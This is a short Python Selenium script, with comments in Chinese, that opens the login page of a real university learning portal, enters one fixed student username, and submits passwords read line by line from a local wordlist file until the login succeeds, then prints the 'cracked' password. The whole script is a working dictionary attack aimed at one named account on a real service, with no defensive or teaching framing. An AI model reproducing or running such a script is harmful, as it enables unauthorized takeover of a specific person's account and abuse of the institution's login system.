from selenium import webdriver

driver = webdriver.Chrome()
driver.get("https://tccas.cyut.edu.tw/cas/login?service=https%3A//tronclass.cyut.edu.tw/login%3Fnext%3D/user/index&locale=zh_TW")


#找到輸入框
element = driver.find_element_by_name("username");
#輸入內容
element.send_keys("t1998025");



path = open(r"C:\Users\user\Desktop\pas.txt")
print("開始破解：")
myStr =path.readline()
while True:
    for i in path:
        #找到輸入框
        element = driver.find_element_by_name("password");
        #輸入內容
        element.send_keys(i);
        print("測試密碼最後為:",i)

        #提交表單

        elem=driver.find_element_by_name("submit")
        elem.click()
        if driver.current_url=='https://tronclass.cyut.edu.tw/user/index':
            print("\n")
            print("破解完成","密碼為:",i)
            break
        


